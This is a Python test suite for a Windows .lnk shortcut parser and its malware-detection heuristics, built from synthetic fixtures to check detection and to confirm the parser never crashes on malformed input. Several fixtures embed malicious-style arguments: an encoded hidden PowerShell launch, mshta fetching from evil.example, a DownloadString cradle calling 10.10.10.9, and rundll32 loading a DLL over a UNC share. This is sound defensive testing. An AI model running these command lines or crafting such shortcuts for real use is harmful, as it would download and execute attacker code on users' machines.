"""Pins app/utils/lnk_parse.py - .lnk parsing and heuristics. Pure, no network.

Every fixture is assembled here with struct against MS-SHLLINK; there are no
sample files and nothing is downloaded. The malformed fixtures exist to prove the
parser degrades to partial results instead of raising on attacker-controlled
binary input.
"""
import os
import random
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from app.utils.lnk_parse import (
    HAS_ARGUMENTS,
    HAS_ICON_LOCATION,
    HAS_LINK_INFO,
    HAS_LINK_TARGET_IDLIST,
    HAS_NAME,
    HAS_RELATIVE_PATH,
    HAS_WORKING_DIR,
    HEADER_SIZE,
    IS_UNICODE,
    LNK_CLSID,
    RUN_AS_USER,
    analyze_lnk,
    analyze_signals,
    lnk_iocs,
    parse_lnk,
)

# FILETIME for the Unix epoch. A fixed, externally-known constant, so this pins
# the conversion rather than round-tripping our own arithmetic.
FILETIME_UNIX_EPOCH = 116444736000000000


def _header(flags, *, attributes=0x20, creation=0, access=0, write=0,
            target_size=0, icon_index=0, show=1, hotkey=0,
            header_size=HEADER_SIZE):
    return struct.pack('<I', header_size) + LNK_CLSID + struct.pack(
        '<IIQQQIIIHHII',
        flags, attributes, creation, access, write, target_size, icon_index,
        show, hotkey, 0, 0, 0,
    )


def _file_entry_item(filename):
    """Shell item, class type 0x32: 12 bytes of fixed fields then an ANSI name."""
    return (
        bytes((0x32, 0x00))
        + struct.pack('<I', 0)
        + struct.pack('<I', 0)
        + struct.pack('<H', 0)
        + filename.encode('latin-1') + b'\x00'
    )


def _volume_item(volume):
    """Shell item, class type 0x2F: the volume name starts at data offset 1."""
    return bytes((0x2F,)) + volume.encode('latin-1') + b'\x00'


def _idlist(items):
    body = b''
    for item in items:
        body += struct.pack('<H', len(item) + 2) + item
    body += b'\x00\x00'
    return struct.pack('<H', len(body)) + body


def _volume_id():
    label = b'\x00'
    return struct.pack('<IIII', 16 + len(label), 3, 0x12345678, 0x10) + label


def _link_info(local_base=None, net_name=None, suffix=''):
    header_len = 0x1C
    volume = _volume_id() if local_base is not None else b''
    local = (local_base.encode('latin-1') + b'\x00') if local_base is not None else b''
    network = b''
    if net_name is not None:
        share = net_name.encode('latin-1') + b'\x00'
        network = struct.pack('<IIIII', 20 + len(share), 0, 0x14, 0, 0) + share
    suffix_bytes = suffix.encode('latin-1') + b'\x00'

    cursor = header_len
    volume_offset = local_offset = network_offset = 0
    if volume:
        volume_offset, cursor = cursor, cursor + len(volume)
    if local:
        local_offset, cursor = cursor, cursor + len(local)
    if network:
        network_offset, cursor = cursor, cursor + len(network)
    suffix_offset, cursor = cursor, cursor + len(suffix_bytes)

    flags = (0x01 if volume else 0) | (0x02 if network else 0)
    head = struct.pack(
        '<IIIIIII', cursor, header_len, flags, volume_offset, local_offset,
        network_offset, suffix_offset,
    )
    return head + volume + local + network + suffix_bytes


def _string_data(value, unicode_strings):
    if unicode_strings:
        return struct.pack('<H', len(value)) + value.encode('utf-16-le')
    encoded = value.encode('latin-1')
    return struct.pack('<H', len(encoded)) + encoded


def _env_block(path):
    ansi = path.encode('latin-1')[:259].ljust(260, b'\x00')
    wide = path.encode('utf-16-le')[:518].ljust(520, b'\x00')
    return struct.pack('<II', 0x314, 0xA0000001) + ansi + wide


def _tracker_block(machine):
    name = machine.encode('latin-1')[:15].ljust(16, b'\x00')
    return (
        struct.pack('<II', 0x60, 0xA0000003)
        + struct.pack('<II', 0x58, 0)
        + name + b'\x00' * 64
    )


def build_lnk(*, local_base=None, net_name=None, suffix='', idlist=None,
              name=None, relative=None, working=None, arguments=None, icon=None,
              show=1, target_size=0, attributes=0x20, hotkey=0, icon_index=0,
              creation=0, access=0, write=0, unicode_strings=True,
              extra_blocks=(), header_size=HEADER_SIZE, trailing=b'',
              extra_flags=0, terminal=True):
    flags = extra_flags
    if idlist is not None:
        flags |= HAS_LINK_TARGET_IDLIST
    if local_base is not None or net_name is not None:
        flags |= HAS_LINK_INFO
    for value, bit in ((name, HAS_NAME), (relative, HAS_RELATIVE_PATH),
                       (working, HAS_WORKING_DIR), (arguments, HAS_ARGUMENTS),
                       (icon, HAS_ICON_LOCATION)):
        if value is not None:
            flags |= bit
    if unicode_strings:
        flags |= IS_UNICODE

    body = b''
    if idlist is not None:
        body += _idlist(idlist)
    if local_base is not None or net_name is not None:
        body += _link_info(local_base, net_name, suffix)
    for value in (name, relative, working, arguments, icon):
        if value is not None:
            body += _string_data(value, unicode_strings)
    for block in extra_blocks:
        body += block
    if terminal:
        body += struct.pack('<I', 0)

    header = _header(
        flags, attributes=attributes, creation=creation, access=access,
        write=write, target_size=target_size, icon_index=icon_index, show=show,
        hotkey=hotkey, header_size=header_size,
    )
    return header + body + trailing


def keys(signals):
    return {signal['key'] for signal in signals}


NOTEPAD = 'C:\\Windows\\System32\\notepad.exe'
POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
BASE64_BLOB = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA' * 8


def scenario_benign():
    data = build_lnk(
        local_base=NOTEPAD, name='Notepad', relative='..\\..\\Windows\\System32\\notepad.exe',
        working='C:\\Windows\\System32', icon=NOTEPAD, show=1, target_size=201216,
        creation=FILETIME_UNIX_EPOCH, hotkey=0x0241,
    )
    parsed = parse_lnk(data)
    assert parsed['parsed_ok'], parsed['error']
    assert parsed['error'] is None
    assert parsed['parse_warnings'] == [], parsed['parse_warnings']
    assert parsed['target_path'] == NOTEPAD, parsed['target_path']
    assert parsed['local_base_path'] == NOTEPAD
    assert parsed['name'] == 'Notepad'
    assert parsed['working_dir'] == 'C:\\Windows\\System32'
    assert parsed['icon_location'] == NOTEPAD
    assert parsed['arguments'] == ''
    assert parsed['show_command'] == 'SW_SHOWNORMAL'
    assert parsed['target_size_bytes'] == 201216
    assert parsed['creation_time'] == '1970-01-01T00:00:00Z', parsed['creation_time']
    assert parsed['access_time'] is None
    assert parsed['hotkey'] == 'CTRL+A', parsed['hotkey']
    assert parsed['run_as_user'] is False
    assert parsed['is_unicode'] is True
    assert 'IsUnicode' in parsed['link_flag_names']
    assert parsed['file_attribute_names'] == ['ARCHIVE']
    assert parsed['drive_type'] == 3
    assert parsed['trailing_bytes'] == 0, parsed['trailing_bytes']
    # A plain Notepad shortcut must produce no signals at all; anything here is a
    # false positive on the most ordinary input there is.
    assert analyze_signals(parsed) == [], analyze_signals(parsed)


def scenario_powershell_encoded():
    arguments = f'-nop -w hidden -ep bypass -enc {BASE64_BLOB}'
    data = build_lnk(
        local_base=POWERSHELL, arguments=arguments, show=7, target_size=0,
        icon='C:\\Windows\\System32\\shell32.dll', icon_index=1,
        name='Invoice.pdf', relative='Invoice.pdf', extra_flags=RUN_AS_USER,
    )
    parsed = parse_lnk(data)
    assert parsed['parsed_ok']
    assert parsed['arguments'] == arguments
    assert parsed['arguments_length'] == len(arguments)
    assert parsed['show_command'] == 'SW_SHOWMINNOACTIVE'
    assert parsed['run_as_user'] is True

    found = keys(analyze_signals(parsed))
    for expected in (
        'lolbas_target', 'encoded_powershell_command', 'base64_blob_in_arguments',
        'hidden_window_argument', 'execution_policy_bypass', 'no_profile_argument',
        'hidden_window_show_command', 'run_as_user', 'excessive_argument_length',
        'document_icon_masquerade', 'document_extension_masquerade',
        'target_size_mismatch',
    ):
        assert expected in found, f'missing {expected}; got {sorted(found)}'
    # No URL, IP, UNC, or cradle, so the network combo must stay quiet.
    assert 'hidden_window_with_network_indicator' not in found
    assert 'embedded_url' not in found


def scenario_mshta_url():
    url = 'https://evil.example/payload.hta'
    data = build_lnk(
        local_base='C:\\Windows\\System32\\mshta.exe', arguments=url, show=7,
        target_size=14848,
    )
    parsed = parse_lnk(data)
    assert parsed['arguments'] == url

    signals = analyze_signals(parsed)
    found = keys(signals)
    assert 'lolbas_target' in found, sorted(found)
    assert 'embedded_url' in found
    assert 'hidden_window_with_network_indicator' in found
    detail = {s['key']: s['detail'] for s in signals}
    assert detail['lolbas_target'] == 'mshta', detail['lolbas_target']

    values = {item['value'] for item in lnk_iocs(parsed)}
    assert 'hxxps://evil[.]example/payload[.]hta' in values, values


def scenario_lolbas_word_boundary():
    """A target merely containing an interpreter name is not an interpreter."""
    benign = build_lnk(
        local_base='C:\\Users\\alice\\Documents\\powershell_helper.txt',
        name='powershell_helper.txt notes about purchase',
    )
    found = keys(analyze_signals(parse_lnk(benign)))
    assert 'lolbas_target' not in found, sorted(found)
    assert 'lolbas_in_arguments' not in found
    # Proves the matcher is not simply always-false.
    real = build_lnk(local_base='C:\\Windows\\System32\\cmd.exe', target_size=289792)
    assert 'lolbas_target' in keys(analyze_signals(parse_lnk(real)))


def scenario_idlist_only():
    """The common malicious shape: a target reachable only via the shell items."""
    data = build_lnk(
        idlist=[_volume_item('C:\\'), _file_entry_item('Windows'),
                _file_entry_item('System32'), _file_entry_item('cmd.exe')],
        arguments='/c powershell -nop IEX (New-Object Net.WebClient).DownloadString'
                  "('http://10.10.10.9/a.ps1')",
        show=7,
    )
    parsed = parse_lnk(data)
    assert parsed['idlist_path'] == 'C:\\Windows\\System32\\cmd.exe', parsed['idlist_path']
    assert parsed['target_path'] == 'C:\\Windows\\System32\\cmd.exe'
    assert parsed['idlist_items'] == ['C:\\', 'Windows', 'System32', 'cmd.exe']

    found = keys(analyze_signals(parsed))
    for expected in ('lolbas_target', 'lolbas_in_arguments', 'invoke_expression',
                     'download_cradle', 'no_profile_argument', 'embedded_url',
                     'embedded_ip', 'hidden_window_with_network_indicator'):
        assert expected in found, f'missing {expected}; got {sorted(found)}'


def scenario_network_share():
    data = build_lnk(net_name='\\\\10.0.0.5\\payload', suffix='stage.exe')
    parsed = parse_lnk(data)
    assert parsed['network_share'] == '\\\\10.0.0.5\\payload', parsed['network_share']
    assert parsed['target_path'] == '\\\\10.0.0.5\\payload\\stage.exe'
    found = keys(analyze_signals(parsed))
    assert 'network_share_target' in found, sorted(found)
    assert 'embedded_ip' in found
    assert 'target_outside_program_locations' not in found


def scenario_extra_data():
    data = build_lnk(
        local_base='C:\\Users\\Public\\Downloads\\stage.exe',
        extra_blocks=[_env_block('%windir%\\system32\\cmd.exe'),
                      _tracker_block('DESKTOP-ABC123')],
    )
    parsed = parse_lnk(data)
    names = [block['name'] for block in parsed['extra_blocks']]
    assert names == ['EnvironmentVariableDataBlock', 'TrackerDataBlock'], names
    assert parsed['env_target'] == '%windir%\\system32\\cmd.exe', parsed['env_target']
    assert parsed['machine_id'] == 'DESKTOP-ABC123', parsed['machine_id']
    assert parsed['trailing_bytes'] == 0

    found = keys(analyze_signals(parsed))
    # The interpreter is only visible in the environment block.
    assert 'lolbas_target' in found, sorted(found)
    assert 'target_in_user_writable_path' in found
    assert 'target_outside_program_locations' in found


def scenario_truncated_header():
    for data in (b'', b'L', b'L\x00\x00\x00', b'L\x00\x00\x00' + b'\x01' * 20,
                 b'L\x00\x00\x00' + LNK_CLSID):
        parsed = parse_lnk(data)
        assert parsed['parsed_ok'] is False
        assert parsed['error'], data
        assert parsed['lnk_size_bytes'] == len(data)
        assert analyze_signals(parsed) == []
        assert lnk_iocs(parsed) == []


def scenario_bad_clsid():
    data = bytearray(build_lnk(local_base=NOTEPAD))
    data[10] = 0xFF
    parsed = parse_lnk(bytes(data))
    assert parsed['parsed_ok'] is False
    assert parsed['clsid_ok'] is False
    assert 'CLSID' in parsed['error']


def scenario_enormous_string_length():
    """A CountCharacters field claiming far more than the file contains."""
    body = struct.pack('<H', 0xFFFF) + 'AB'.encode('utf-16-le')
    data = _header(HAS_ARGUMENTS | IS_UNICODE) + body
    parsed = parse_lnk(data)
    assert parsed['parsed_ok'] is True
    assert parsed['arguments'] == 'AB', repr(parsed['arguments'])
    assert any('claims' in warning for warning in parsed['parse_warnings']), \
        parsed['parse_warnings']
    assert isinstance(analyze_signals(parsed), list)

    # Same lie in the ANSI form, and with no payload bytes at all.
    for tail in (struct.pack('<H', 0xFFFF), struct.pack('<H', 0xFFFF) + b'AB'):
        loose = parse_lnk(_header(HAS_ARGUMENTS) + tail)
        assert loose['parsed_ok'] is True
        assert len(loose['arguments']) <= 2


def scenario_enormous_structure_lengths():
    """IDList, LinkInfo, and ExtraData all claiming more than the buffer holds."""
    idlist_lie = _header(HAS_LINK_TARGET_IDLIST) + struct.pack('<HH', 0xFFFF, 0xFFFF)
    parsed = parse_lnk(idlist_lie)
    assert parsed['parsed_ok'] is True
    assert any('exceeds buffer' in w for w in parsed['parse_warnings']), \
        parsed['parse_warnings']

    linkinfo_lie = _header(HAS_LINK_INFO) + struct.pack('<II', 0xFFFFFFF0, 0x1C)
    parsed = parse_lnk(linkinfo_lie)
    assert parsed['parsed_ok'] is True
    assert parsed['target_path'] == ''
    assert any('exceeds buffer' in w for w in parsed['parse_warnings'])

    tiny_linkinfo = _header(HAS_LINK_INFO) + struct.pack('<I', 3)
    assert parse_lnk(tiny_linkinfo)['parsed_ok'] is True

    extra_lie = build_lnk(local_base=NOTEPAD, terminal=False) + struct.pack(
        '<II', 0x7FFFFFFF, 0xA0000001)
    parsed = parse_lnk(extra_lie)
    assert parsed['parsed_ok'] is True
    assert parsed['target_path'] == NOTEPAD
    assert any('exceeds buffer' in w for w in parsed['parse_warnings'])

    # A zero-size shell item must terminate the walk, not spin on it.
    zero_item = _header(HAS_LINK_TARGET_IDLIST) + struct.pack('<H', 6) + b'\x00' * 6
    assert parse_lnk(zero_item)['parsed_ok'] is True


def scenario_non_utf16_junk():
    """Odd byte counts and unpaired surrogates in string fields."""
    junk = struct.pack('<H', 5) + b'\xff\xd8\x00\xdc\xff'  # odd length, lone surrogate
    data = _header(HAS_ARGUMENTS | IS_UNICODE) + junk
    parsed = parse_lnk(data)
    assert parsed['parsed_ok'] is True
    assert isinstance(parsed['arguments'], str)
    assert analyze_signals(parsed) is not None

    ansi_junk = _header(HAS_NAME) + struct.pack('<H', 4) + b'\x80\x81\x82\x83'
    assert parse_lnk(ansi_junk)['parsed_ok'] is True


def scenario_header_followed_by_garbage():
    rng = random.Random(7)
    flags = 0xFFFFFFFF
    for length in (1, 7, 32, 200, 2048):
        garbage = bytes(rng.randrange(256) for _ in range(length))
        parsed = parse_lnk(_header(flags) + garbage)
        assert parsed['parsed_ok'] is True
        assert isinstance(parsed['parse_warnings'], list)
        assert isinstance(analyze_signals(parsed), list)


def scenario_appended_payload():
    blob = b'MZ' + b'\x90' * (70 * 1024)
    data = build_lnk(local_base=NOTEPAD, target_size=201216, trailing=blob)
    parsed = parse_lnk(data)
    assert parsed['parsed_ok'] is True
    assert parsed['target_path'] == NOTEPAD
    assert parsed['trailing_bytes'] == len(blob), parsed['trailing_bytes']
    found = keys(analyze_signals(parsed))
    assert 'appended_data_after_structures' in found, sorted(found)
    assert 'oversized_lnk_file' in found
    # A few slack bytes are not an appended payload.
    small = parse_lnk(build_lnk(local_base=NOTEPAD, trailing=b'\x00' * 4))
    assert 'appended_data_after_structures' not in keys(analyze_signals(small))


def scenario_malformed_header_size():
    parsed = parse_lnk(build_lnk(local_base=NOTEPAD, header_size=0x4D))
    assert parsed['parsed_ok'] is True
    # The lying size must not move where the structures are read from.
    assert parsed['target_path'] == NOTEPAD, parsed['target_path']
    assert 'malformed_header_size' in keys(analyze_signals(parsed))


def scenario_signal_shape():
    """Every emitted signal is a snake_case key with a label a template can show."""
    data = build_lnk(
        local_base=POWERSHELL, arguments='-w hidden -enc ' + BASE64_BLOB, show=7)
    for signal in analyze_signals(parse_lnk(data)):
        assert set(signal) == {'key', 'label', 'detail'}, signal
        assert signal['key'] == signal['key'].lower()
        assert ' ' not in signal['key']
        assert signal['label'] and not signal['label'].endswith('.')
        assert signal['detail'] is None or isinstance(signal['detail'], str)


def scenario_analyze_lnk_wrapper():
    result = analyze_lnk(build_lnk(
        local_base='C:\\Windows\\System32\\rundll32.exe',
        arguments='\\\\198.51.100.7\\share\\a.dll,Entry'))
    assert set(result) == {'parsed', 'signals', 'iocs'}
    assert result['parsed']['parsed_ok'] is True
    found = keys(result['signals'])
    assert 'lolbas_target' in found and 'unc_path_in_arguments' in found, sorted(found)
    assert any(item['type'] == 'ipv4' for item in result['iocs'])
    # Non-bytes input is a caller error, not an exception.
    for bad in (None, 'not bytes', 42, []):
        assert analyze_lnk(bad)['parsed']['error'] == 'input is not bytes'
    assert analyze_lnk(bytearray(build_lnk(local_base=NOTEPAD)))['parsed']['parsed_ok']


SCENARIOS = (
    scenario_benign,
    scenario_powershell_encoded,
    scenario_mshta_url,
    scenario_lolbas_word_boundary,
    scenario_idlist_only,
    scenario_network_share,
    scenario_extra_data,
    scenario_truncated_header,
    scenario_bad_clsid,
    scenario_enormous_string_length,
    scenario_enormous_structure_lengths,
    scenario_non_utf16_junk,
    scenario_header_followed_by_garbage,
    scenario_appended_payload,
    scenario_malformed_header_size,
    scenario_signal_shape,
    scenario_analyze_lnk_wrapper,
)


def fuzz_inputs():
    """Deterministic malformed inputs: truncations, mutations, and pure noise."""
    kitchen_sink = build_lnk(
        idlist=[_volume_item('C:\\'), _file_entry_item('Windows'),
                _file_entry_item('System32'), _file_entry_item('cmd.exe')],
        local_base='C:\\Windows\\System32\\cmd.exe', suffix='',
        net_name='\\\\host\\share',
        name='lure', relative='..\\cmd.exe', working='%TEMP%',
        arguments='/c powershell -enc ' + BASE64_BLOB, icon='shell32.dll',
        show=7, target_size=0xFFFFFFFF, attributes=0xFFFF, hotkey=0xFFFF,
        creation=0xFFFFFFFFFFFFFFFF, access=1, write=0x7FFFFFFFFFFFFFFF,
        extra_blocks=[_env_block('%comspec%'), _tracker_block('HOST')],
    )
    for length in range(len(kitchen_sink) + 1):
        yield kitchen_sink[:length]

    rng = random.Random(1337)
    for _ in range(500):
        mutant = bytearray(kitchen_sink)
        for _ in range(rng.randrange(1, 6)):
            mutant[rng.randrange(len(mutant))] = rng.randrange(256)
        yield bytes(mutant)

    for _ in range(200):
        length = rng.randrange(0, 512)
        yield bytes(rng.randrange(256) for _ in range(length))
        yield _header(rng.randrange(2 ** 32)) + bytes(
            rng.randrange(256) for _ in range(length))

    for length in (0, 1, 75, 76, 77, 1024):
        yield b'\x00' * length
        yield b'\xff' * length


def main():
    for scenario in SCENARIOS:
        scenario()

    fuzzed = 0
    for candidate in fuzz_inputs():
        try:
            result = analyze_lnk(candidate)
        except Exception as exc:  # noqa: BLE001 - the whole point is "never raises"
            raise AssertionError(
                f'analyze_lnk raised on a {len(candidate)}-byte input: {exc!r}'
            ) from exc
        assert isinstance(result['parsed'], dict)
        assert isinstance(result['parsed']['parse_warnings'], list)
        assert isinstance(result['signals'], list)
        assert isinstance(result['iocs'], list)
        fuzzed += 1

    print(f'PASS: {len(SCENARIOS)} scenario + {fuzzed} fuzz cases')


if __name__ == '__main__':
    main()
